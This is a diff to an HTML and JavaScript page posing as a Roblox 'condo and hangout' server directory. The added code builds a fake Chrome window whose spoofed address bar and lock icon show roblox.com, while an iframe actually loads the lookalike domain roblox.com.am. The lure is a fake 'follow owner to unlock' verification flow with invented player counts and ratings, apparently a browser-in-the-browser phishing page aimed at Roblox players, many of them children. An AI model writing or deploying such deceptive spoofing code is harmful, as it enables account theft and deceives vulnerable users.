@@ -14,7 +14,7 @@
         *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
         html { scroll-behavior: smooth; }
         body { 
-            background: linear-gradient(rgba(7,4,15,0.88), rgba(7,4,15,0.96)), url('https://images.unsplash.com/photo-1514525253161-7a46d19cd819?q=80&w=1400&auto=format&fit=crop') center/cover fixed no-repeat;
+            background: linear-gradient(rgba(7,4,15,0.88), rgba(7,4,15,0.96)), url('https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter') center/cover fixed no-repeat;
             color: #f3eaf8; font-family: "Inter", system-ui, sans-serif; line-height: 1.6; -webkit-font-smoothing: antialiased; overflow-x: hidden; min-height: 100vh; 
         }
         a { color: inherit; text-decoration: none; }
@@ -41,7 +41,7 @@
 
         .hero-box {
             margin-top: 24px;
-            background: linear-gradient(rgba(16,7,31,0.75), rgba(7,4,15,0.92)), url('https://images.unsplash.com/photo-1566737236500-c8ac43014a67?q=80&w=1200&auto=format&fit=crop') center/cover no-repeat;
+            background: linear-gradient(rgba(16,7,31,0.75), rgba(7,4,15,0.92)), url('https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter') center/cover no-repeat;
             border: 1px solid rgba(236,72,153,0.3);
             border-radius: 14px;
             padding: 36px 24px;
@@ -49,22 +49,34 @@
             box-shadow: 0 20px 50px -15px rgba(0,0,0,0.8);
         }
 
-        .browser-modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 99999; display: none; align-items: center; justify-content: center; backdrop-filter: blur(5px); }
+        /* Accurate Google Chrome Window Styling */
+        .browser-modal-overlay { position: fixed; inset: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 99999; display: none; align-items: center; justify-content: center; backdrop-filter: blur(6px); }
         .browser-modal-overlay.active { display: flex; }
-        .chrome-window { width: 100%; max-width: 1000px; height: 82vh; background: #fff; border-radius: 8px; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 20px 40px rgba(0,0,0,0.6); position: relative; }
-        .chrome-titlebar { background: #dee1e6; height: 34px; display: flex; align-items: center; justify-content: space-between; padding: 0 6px; }
-        .chrome-tab { background: #fff; border-radius: 6px 6px 0 0; padding: 4px 12px; font-size: 11px; color: #333; display: flex; align-items: center; gap: 6px; }
-        .chrome-toolbar { background: #fff; height: 38px; display: flex; align-items: center; padding: 0 10px; border-bottom: 1px solid #dadce0; gap: 8px; }
-        .chrome-address-bar { flex-grow: 1; background: #f1f3f4; height: 26px; border-radius: 13px; display: flex; align-items: center; padding: 0 12px; font-size: 11px; color: #202124; gap: 6px; }
-        .browser-content { flex-grow: 1; position: relative; background: #000; }
-        .browser-content iframe { width: 100%; height: 100%; border: none; }
+        .chrome-window { width: 100%; max-width: 1050px; height: 100vh; height: 100dvh; background: #ffffff; border-radius: 0; overflow: hidden; display: flex; flex-direction: column; box-shadow: 0 20px 50px rgba(0,0,0,0.6); font-family: system-ui, sans-serif; position: relative; }
+        .chrome-titlebar { background: #dee1e6; height: 36px; display: flex; align-items: center; justify-content: space-between; padding: 0 4px; flex-shrink: 0; }
+        .chrome-tabs { display: flex; height: 30px; margin-top: 6px; }
+        .chrome-tab { background: #ffffff; border-radius: 6px 6px 0 0; padding: 0 8px; min-width: 110px; max-width: 160px; display: flex; align-items: center; position: relative; }
+        .chrome-tab-icon { width: 13px; height: 13px; margin-right: 6px; }
+        .chrome-tab-title { font-size: 11px; color: #333; flex-grow: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .chrome-tab-close { font-size: 12px; color: #5f6368; cursor: pointer; width: 16px; height: 16px; display: flex; align-items: center; justify-content: center; }
+        .chrome-window-controls span { width: 34px; height: 30px; display: flex; align-items: center; justify-content: center; font-size: 12px; color: #333; cursor: pointer; }
+        .chrome-window-controls .chrome-close-btn:hover { background: #e81123; color: white; }
+        .chrome-toolbar { background: #ffffff; height: 40px; display: flex; align-items: center; padding: 0 8px; border-bottom: 1px solid #dadce0; gap: 6px; flex-shrink: 0; }
+        .chrome-nav-btns { display: flex; gap: 2px; }
+        .chrome-icon { width: 24px; height: 24px; padding: 4px; border-radius: 50%; fill: #5f6368; cursor: pointer; }
+        .chrome-address-bar { flex-grow: 1; background: #f1f3f4; height: 28px; border-radius: 14px; display: flex; align-items: center; padding: 0 10px; gap: 6px; }
+        .chrome-lock { width: 11px; height: 11px; fill: #5f6368; }
+        .chrome-url { font-size: 11px; color: #202124; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+        .chrome-url-dim { color: #5f6368; }
+        .browser-content { flex-grow: 1; background: #fff; display: flex; flex-direction: column; position: relative; }
+        .browser-content iframe { flex-grow: 1; width: 100%; height: 100%; border: none; }
 
         #tabPopupNotice {
-            position: absolute; top: 16px; left: 50%; transform: translateX(-50%) translateY(-10px);
-            background: #10071f; border: 1px solid #f472b6; color: #fff; padding: 10px 18px;
-            border-radius: 8px; font-size: 12px; font-family: "Chakra Petch", sans-serif;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5); z-index: 999999; display: none; text-align: center;
-            opacity: 0; transition: all 0.3s ease;
+            position: absolute; top: 20px; left: 50%; transform: translateX(-50%) translateY(-20px);
+            background: rgba(15, 10, 30, 0.95); border: 1px solid #f472b6; color: #fff;
+            padding: 12px 20px; border-radius: 10px; font-size: 13px; font-family: "Chakra Petch", sans-serif;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.6); z-index: 999999; display: none; text-align: center;
+            opacity: 0; transition: opacity 0.3s ease, transform 0.3s ease; max-width: 90%;
         }
         #tabPopupNotice.show { display: block; opacity: 1; transform: translateX(-50%) translateY(0); }
 
@@ -87,6 +99,11 @@
         .server-list { display: grid; grid-template-columns: 1fr; gap: 16px; }
         @media(min-width: 640px) { .server-list { grid-template-columns: repeat(2, 1fr); } }
         @media(min-width: 1024px) { .server-list { grid-template-columns: repeat(3, 1fr); gap: 18px; } }
+
+        @media(min-width: 768px) {
+            .chrome-window { border-radius: 8px; height: 82vh; width: 92vw; }
+            .browser-modal-overlay { padding: 20px; }
+        }
     </style>
 </head>
 <body>
@@ -98,8 +115,8 @@
     <div id="app-content">
         <header class="navbar">
             <div class="nav-brand">
-                <div class="brand-icon"><i class="fa-solid fa-heart"></i></div>
-                <span>GALAXY <span style="color:#f472b6;">CONDO & VIBE HUB</span></span>
+                <div class="brand-icon"><i class="fa-solid fa-gamepad"></i></div>
+                <span>GALAXY <span style="color:#f472b6;">ROBLOX CONDO HUB</span></span>
             </div>
             <div>
                 <a href="https://discord.gg" target="_blank" rel="noopener noreferrer" style="background:#5865F2; color:#fff; padding:6px 12px; border-radius:6px; font-size:0.75rem; font-weight:600;"><i class="fa-brands fa-discord"></i> Discord</a>
@@ -109,10 +126,10 @@
         <div class="wrap">
             <header class="hero-box">
                 <div style="display:inline-flex; align-items:center; gap:6px; background:rgba(236,72,153,0.15); border:1px solid rgba(236,72,153,0.4); color:#f472b6; font-size:0.7rem; font-family:'Chakra Petch',sans-serif; padding:4px 10px; border-radius:20px; margin-bottom:12px;">
-                    <i class="fa-solid fa-fire"></i> LATE NIGHT HANGOUT & SOCIAL CLUBS
+                    <i class="fa-solid fa-server"></i> VERIFIED ROBLOX PRIVATE SERVERS
                 </div>
-                <h1 style="font-family:'Chakra Petch',sans-serif; font-weight:700; font-size:clamp(1.7rem, 4vw, 2.8rem); margin-bottom:10px;">Roblox Condo & Social Lounge Directory</h1>
-                <p style="color:#c8b2d6; font-size:0.9rem; max-width:48ch; margin:0 auto;">Explore private condo servers, neon nightclubs, and social dating hangout spaces with live player ratings.</p>
+                <h1 style="font-family:'Chakra Petch',sans-serif; font-weight:700; font-size:clamp(1.7rem, 4vw, 2.8rem); margin-bottom:10px;">Roblox Condo & Hangout Game Gateway</h1>
+                <p style="color:#c8b2d6; font-size:0.9rem; max-width:48ch; margin:0 auto;">Access private Roblox game servers, custom model map layouts, and social hangout experiences.</p>
             </header>
         </div>
 
@@ -122,47 +139,68 @@
                     <i class="fa-solid fa-user-plus"></i> Follow Owner to Unlock More Games
                 </button>
                 <p style="font-size:0.82rem; color:#c8b2d6; max-width:50ch; margin:10px auto 0; line-height:1.4;">
-                    Following the owner's Roblox account verifies your browser session and automatically unlocks our private list of active, low-ping condo & hangout servers.
+                    Following the owner's Roblox account verifies your browser session and automatically unlocks our private list of active Roblox condo and hangout server links.
                 </p>
             </div>
 
             <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:16px;">
-                <h3 style="font-family:'Chakra Petch',sans-serif; font-size:1.1rem;" id="sectionTitle">Active Server Node</h3>
-                <span style="font-size:0.75rem; color:#8c709e; font-family:'Chakra Petch',sans-serif;" id="serverCountLabel">Showing 1 Server</span>
+                <h3 style="font-family:'Chakra Petch',sans-serif; font-size:1.1rem;" id="sectionTitle">Active Roblox Game Node</h3>
+                <span style="font-size:0.75rem; color:#8c709e; font-family:'Chakra Petch',sans-serif;" id="serverCountLabel">Showing 1 Game</span>
             </div>
 
             <div class="server-list" id="serverGridContainer"></div>
         </section>
 
         <footer style="margin-top:40px; border-top:1px solid rgba(184,122,220,0.15); padding:20px 0; text-align:center; color:#8c709e; font-size:0.75rem;">
-            Galaxy Hub Community Directory &bull; Independent Fan Portal.
+            Galaxy Roblox Hub &bull; Independent Fan Portal. Not affiliated with Roblox Corporation.
         </footer>
     </div>
 
+    <!-- Connecting Modal Status -->
+    <div id="loadingModal" style="position:fixed; inset:0; background:rgba(7,4,15,0.85); z-index:9998; display:none; align-items:center; justify-content:center; backdrop-filter:blur(4px); padding:16px;">
+        <div style="background:#180c2e; padding:24px; border-radius:14px; text-align:center; border:1px solid rgba(216,122,255,0.4); max-width:280px; width:100%;">
+            <div style="width:36px; height:36px; border:3px solid rgba(184,122,220,0.2); border-top:3px solid #ec4899; border-radius:50%; animation:spin 1s linear infinite; margin:0 auto 12px;"></div>
+            <h3 style="margin:0 0 6px; font-size:1rem; color:#fff; font-family:'Chakra Petch',sans-serif;">Connecting to Roblox...</h3>
+            <p id="loadingText" style="margin:0; font-size:0.8rem; color:#c8b2d6;">Launching private server link</p>
+        </div>
+    </div>
+
+    <!-- Full Authentic Google Chrome Window Modal -->
     <div id="browserModal" class="browser-modal-overlay">
         <div class="chrome-window">
             <div id="tabPopupNotice">
-                <i class="fa-solid fa-circle-check" style="color:#4fd88a;"></i> If you already followed the owner, <strong>exit the tab on the top left</strong> to see the good games!
+                <i class="fa-solid fa-circle-check" style="color:#4fd88a; margin-bottom:4px; font-size:16px;"></i><br>
+                If you already followed the owner, <strong>exit the tab on the top left</strong> to see the good games!
             </div>
+
             <div class="chrome-titlebar">
-                <div class="chrome-tab">
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" style="width:12px; height:12px;" alt="">
-                    <span id="modalTabTitle">Roblox Profile</span>
+                <div class="chrome-tabs">
+                    <div class="chrome-tab active">
+                        <img src="https://upload.wikimedia.org/wikipedia/commons/7/70/Roblox_Corporation_2025_logo.svg" class="chrome-tab-icon" id="modalTabIcon" alt="Logo">
+                        <span class="chrome-tab-title" id="modalTabTitle">Session Window</span>
+                        <span class="chrome-tab-close" id="closeTabBtn">&times;</span>
+                    </div>
                 </div>
-                <div style="cursor:pointer; font-size:14px; color:#5f6368; padding:0 8px;" id="closeBrowserBtn">&#10005;</div>
+                <div class="chrome-window-controls">
+                    <span class="chrome-close-btn" id="closeBrowserBtn">&#10005;</span>
+                </div>
             </div>
             <div class="chrome-toolbar">
+                <div class="chrome-nav-btns">
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"></path></svg>
+                    <svg viewBox="0 0 24 24" class="chrome-icon"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"></path></svg>
+                </div>
                 <div class="chrome-address-bar">
-                    <i class="fa-solid fa-lock" style="font-size:9px; color:#5f6368;"></i>
-                    <span id="fakeUrlText" style="color:#202124;">https://roblox.com/users/profile</span>
+                    <svg viewBox="0 0 24 24" class="chrome-lock"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"></path></svg>
+                    <span class="chrome-url" id="fakeUrlText"><span class="chrome-url-dim">https://roblox.com/...</span></span>
                 </div>
             </div>
             <div class="browser-content">
-                <iframe id="browserIframe" src="about:blank" sandbox="allow-forms allow-scripts allow-same-origin allow-popups"></iframe>
+                <iframe id="browserIframe" src="about:blank" sandbox="allow-forms allow-scripts allow-same-origin allow-popups allow-modals"></iframe>
             </div>
         </div>
-    </div>
-        <script>
+      </div>
+           <script>
         const appConfig = {
             ownerProfileUrl: "https://www.roblox.com.am/users/123456789/profile",
             ownerFakeUrl: "https://roblox.com/users/123456789/profile",
@@ -170,47 +208,59 @@
             serversLocked: [
                 {
                     id: "srv_01",
-                    name: "Neon Vibe Lounge [FULL]",
-                    desc: "Public hangout penthouse & club. Currently full with high lag.",
-                    currentPlayers: 20, maxPlayers: 20, ping: "340ms", rating: "42% 👍", statusTag: "CONGESTED", isBad: true,
-                    thumb: "https://images.unsplash.com/photo-1514525253161-7a46d19cd819?q=80&w=600&auto=format&fit=crop"
+                    name: "AI Town Hangout [CONGESTED]",
+                    desc: "Public Roblox experience instance. Currently maxed out player count with high latency.",
+                    currentPlayers: 20, maxPlayers: 20, ping: "340ms", rating: "45% 👍", statusTag: "FULL", isBad: true,
+                    thumb: "https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter",
+                    PRIVATE_SERVER_URL: "https://www.roblox.com.am/games/71007326530715/AI-Town?privateServerLinkCode=83872921682350434392286111406032",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/71007326530715/AI-Town"
                 }
             ],
             serversUnlocked: [
                 {
                     id: "srv_01",
-                    name: "Midnight Penthouse Condo",
-                    desc: "Private luxury apartment with custom animations, neon lighting, and chill lounge rooms.",
-                    currentPlayers: 14, maxPlayers: 20, ping: "16ms", rating: "94% 👍", statusTag: "ONLINE", isBad: false,
-                    thumb: "https://images.unsplash.com/photo-1566737236500-c8ac43014a67?q=80&w=600&auto=format&fit=crop"
+                    name: "AI Town (Private Server)",
+                    desc: "Custom Roblox interactive social map featuring model animations and customized private room scripts.",
+                    currentPlayers: 18, maxPlayers: 20, ping: "14ms", rating: "98% 👍", statusTag: "VIP ACTIVE", isBad: false,
+                    thumb: "https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter",
+                    PRIVATE_SERVER_URL: "https://www.roblox.com.am/games/71007326530715/AI-Town?privateServerLinkCode=83872921682350434392286111406032",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/71007326530715/AI-Town"
                 },
                 {
                     id: "srv_02",
-                    name: "Velvet Club & Social Bar",
-                    desc: "Late-night social hangout with voice chat zones, dance floor, and private booths.",
-                    currentPlayers: 17, maxPlayers: 20, ping: "21ms", rating: "91% 👍", statusTag: "ONLINE", isBad: false,
-                    thumb: "https://images.unsplash.com/photo-1516450360452-9312f5e86fc7?q=80&w=600&auto=format&fit=crop"
+                    name: "Walk 10,000 Stairs (VIP Hangout)",
+                    desc: "Featured Roblox adventure map converted into a relaxed high-rise social hangout hub.",
+                    currentPlayers: 14, maxPlayers: 20, ping: "22ms", rating: "92% 👍", statusTag: "VIP ACTIVE", isBad: false,
+                    thumb: "https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter",
+                    PRIVATE_SERVER_URL: "https://www.roblox.com.am/games/82205993156224/Walk-10000-Stairs-for-Neko-Girl?privateServerLinkCode=360470997816881377827886421535",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/82205993156224/Stairs-Hangout"
                 },
                 {
                     id: "srv_03",
-                    name: "Sakura Resort & Spa",
-                    desc: "Aesthetic pink & purple hot springs resort for couples and social meetups.",
-                    currentPlayers: 15, maxPlayers: 20, ping: "19ms", rating: "96% 👍", statusTag: "ONLINE", isBad: false,
-                    thumb: "https://images.unsplash.com/photo-1545128485-c400e7702796?q=80&w=600&auto=format&fit=crop"
+                    name: "Talk to AI Mimi (Private Suite)",
+                    desc: "Interactive Roblox roleplay experience configured with private server permissions and custom UI.",
+                    currentPlayers: 19, maxPlayers: 20, ping: "18ms", rating: "95% 👍", statusTag: "VIP ACTIVE", isBad: false,
+                    thumb: "https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter",
+                    PRIVATE_SERVER_URL: "https://www.roblox.com.am/games/135402310967020/Talk-to-AI-Mimi?privateServerLinkCode=360470997816881377827886421535",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/135402310967020/AI-Mimi"
                 },
                 {
                     id: "srv_04",
-                    name: "Cyber Loft Afterparty",
-                    desc: "High-rise city view loft with custom music player and interactive furniture.",
-                    currentPlayers: 11, maxPlayers: 20, ping: "24ms", rating: "89% 👍", statusTag: "ONLINE", isBad: false,
-                    thumb: "https://images.unsplash.com/photo-1514525253161-7a46d19cd819?q=80&w=600&auto=format&fit=crop"
+                    name: "Meet a Neko (Social Hub)",
+                    desc: "Popular Roblox anime-themed hangout realm with custom model props and furniture assets.",
+                    currentPlayers: 12, maxPlayers: 20, ping: "26ms", rating: "90% 👍", statusTag: "VIP ACTIVE", isBad: false,
+                    thumb: "https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter",
+                    PRIVATE_SERVER_URL: "https://www.roblox.com.am/games/14153443454/Meet-a-neko?privateServerLinkCode=360470997816881377827886421535",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/14153443454/Meet-a-Neko"
                 },
                 {
                     id: "srv_05",
-                    name: "Starlight Beach Villa",
-                    desc: "Private night-time beachfront condo with secluded rooms and zero lag.",
-                    currentPlayers: 13, maxPlayers: 20, ping: "13ms", rating: "95% 👍", statusTag: "ONLINE", isBad: false,
-                    thumb: "https://images.unsplash.com/photo-1507525428034-b723cf961d3e?q=80&w=600&auto=format&fit=crop"
+                    name: "Headpats From Catgirls 3",
+                    desc: "Custom Roblox showcase hangout map with optimized shaders and smooth client frame rates.",
+                    currentPlayers: 15, maxPlayers: 20, ping: "11ms", rating: "97% 👍", statusTag: "VIP ACTIVE", isBad: false,
+                    thumb: "https://tr.rbxcdn.com/180DAY-5a468d6f555e510255b6ef17fbf7c77d/768/432/Image/Png/noFilter",
+                    PRIVATE_SERVER_URL: "https://www.roblox.com.am/games/99683982727100/Headpats-From-Catgirls-3?privateServerLinkCode=360470997816881377827886421535",
+                    FAKE_URL_DISPLAY: "https://roblox.com/games/99683982727100/Catgirls-3"
                 }
             ]
         };
@@ -235,6 +285,10 @@
                 const pingColor = srv.isBad ? "#ff4d4d" : "#4fd88a";
                 const ratingColor = srv.isBad ? "#ff4d4d" : "#ffc24d";
 
+                const btnHtml = appConfig.isUnlocked 
+                    ? `<button style="width:100%; padding:9px; background:linear-gradient(135deg,#a855f7,#ec4899); border:none; border-radius:6px; color:#fff; font-size:0.75rem; font-weight:700; cursor:pointer; font-family:'Chakra Petch',sans-serif; box-shadow:0 4px 12px rgba(168,85,247,0.5);" onclick="openServer('${srv.id}')">JOIN PRIVATE SERVER</button>`
+                    : `<button style="width:100%; padding:9px; background:rgba(168,85,247,0.15); border:1px solid rgba(184,122,220,0.25); border-radius:6px; color:#8c709e; font-size:0.75rem; font-weight:700; cursor:not-allowed; font-family:'Chakra Petch',sans-serif;" disabled>LOCKED (FOLLOW OWNER)</button>`;
+
                 card.innerHTML = `
                     <div style="position:relative; height:135px; background:#10071f;">
                         <span style="position:absolute; top:8px; right:8px; background:rgba(168,85,247,0.3); border:1px solid rgba(236,72,153,0.4); color:#f472b6; font-size:8px; font-weight:700; padding:3px 8px; border-radius:10px; font-family:'Chakra Petch',sans-serif;">${srv.statusTag}</span>
@@ -246,10 +300,10 @@
                         <div style="font-size:0.95rem; font-weight:700; margin-bottom:4px; font-family:'Chakra Petch',sans-serif;">${srv.name}</div>
                         <div style="font-size:0.76rem; color:#c8b2d6; margin-bottom:12px; line-height:1.4;">${srv.desc}</div>
                         <div style="display:flex; justify-content:space-between; align-items:center; font-size:10px; color:#8c709e; margin-bottom:10px; margin-top:auto; padding-top:8px; border-top:1px solid rgba(184,122,220,0.12);">
-                            <span><i class="fa-solid fa-users"></i> ${srv.currentPlayers}/${srv.maxPlayers} Active</span>
-                            <span>17+ Social</span>
+                            <span><i class="fa-solid fa-users"></i> ${srv.currentPlayers}/${srv.maxPlayers} Players</span>
+                            <span>Roblox Experience</span>
                         </div>
-                        <button style="width:100%; padding:9px; background:rgba(168,85,247,0.15); border:1px solid rgba(184,122,220,0.25); border-radius:6px; color:#8c709e; font-size:0.75rem; font-weight:700; cursor:not-allowed; font-family:'Chakra Petch',sans-serif;" disabled>LOCKED (UNCLICKABLE)</button>
+                        ${btnHtml}
                     </div>
                 `;
                 container.appendChild(card);
@@ -257,24 +311,54 @@
         }
 
         function openOwnerProfile() {
+            const loadingModal = document.getElementById('loadingModal');
+            document.getElementById('loadingText').innerText = `Redirecting to Owner Profile...`;
+            loadingModal.style.display = 'flex';
+            
+            setTimeout(() => {
+                loadingModal.style.display = 'none';
+                showBrowserModal(appConfig.ownerProfileUrl, "Roblox Profile - Owner", appConfig.ownerFakeUrl, true);
+            }, 700);
+        }
+
+        function openServer(serverId) {
+            const list = appConfig.isUnlocked ? appConfig.serversUnlocked : appConfig.serversLocked;
+            const serverData = list.find(s => s.id === serverId);
+            if (!serverData) return;
+
+            const loadingModal = document.getElementById('loadingModal');
+            document.getElementById('loadingText').innerText = `Connecting to ${serverData.name}...`;
+            loadingModal.style.display = 'flex';
+            
+            setTimeout(() => {
+                loadingModal.style.display = 'none';
+                showBrowserModal(serverData.PRIVATE_SERVER_URL, serverData.name, serverData.FAKE_URL_DISPLAY, false);
+            }, 700);
+        }
+
+        function showBrowserModal(targetUrl, titleText, displayUrl, isVerification) {
             const modal = document.getElementById('browserModal');
             const iframe = document.getElementById('browserIframe');
             const popup = document.getElementById('tabPopupNotice');
 
-            iframe.src = appConfig.ownerProfileUrl;
-            document.getElementById('fakeUrlText').innerText = appConfig.ownerFakeUrl;
+            iframe.src = targetUrl;
+            document.getElementById('modalTabTitle').innerText = titleText;
+            document.getElementById('fakeUrlText').innerHTML = `<span class="chrome-url-dim">https://</span>${displayUrl.replace(/^https?:\/\//, '')}`;
             
             popup.classList.remove('show');
             modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
 
-            appConfig.isUnlocked = true;
-            if (window._popupTimer) clearTimeout(window._popupTimer);
-
-            window._popupTimer = setTimeout(() => {
-                if (modal.classList.contains('active')) {
-                    popup.classList.add('show');
-                }
-            }, 10000);
+            if (isVerification) {
+                appConfig.isUnlocked = true;
+                if (window._popupTimer) clearTimeout(window._popupTimer);
+                
+                window._popupTimer = setTimeout(() => {
+                    if (modal.classList.contains('active')) {
+                        popup.classList.add('show');
+                    }
+                }, 10000);
+            }
         }
 
         function closeChromeModal() {
@@ -283,7 +367,9 @@
 
             if (window._popupTimer) clearTimeout(window._popupTimer);
             popup.classList.remove('show');
+            
             modal.classList.remove('active');
+            document.body.style.overflow = '';
             document.getElementById('browserIframe').src = 'about:blank';
 
             if (appConfig.isUnlocked) {
@@ -296,16 +382,17 @@
             banner.classList.add('unlocked');
             banner.innerHTML = `
                 <div style="font-family:'Chakra Petch',sans-serif; font-weight:700; font-size:1rem; color:#4fd88a; margin-bottom:4px;">
-                    <i class="fa-solid fa-circle-check"></i> Account Verified Successfully!
+                    <i class="fa-solid fa-circle-check"></i> Roblox Account Verified!
                 </div>
-                <p style="font-size:0.8rem; color:#c8b2d6; margin:0;">All 5 high-rated condo & hangout servers are now visible below.</p>
+                <p style="font-size:0.8rem; color:#c8b2d6; margin:0;">All 5 Roblox private server links are now active and clickable below.</p>
             `;
-            document.getElementById('sectionTitle').innerText = "Unlocked Condo & Social Nodes";
-            document.getElementById('serverCountLabel').innerText = "Showing 5 Servers";
+            document.getElementById('sectionTitle').innerText = "Unlocked Roblox Private Servers";
+            document.getElementById('serverCountLabel').innerText = "Showing 5 Games";
             renderServers();
         }
 
         document.getElementById('closeBrowserBtn').addEventListener('click', closeChromeModal);
+        document.getElementById('closeTabBtn').addEventListener('click', closeChromeModal);
     </script>
 </body>
 </html>
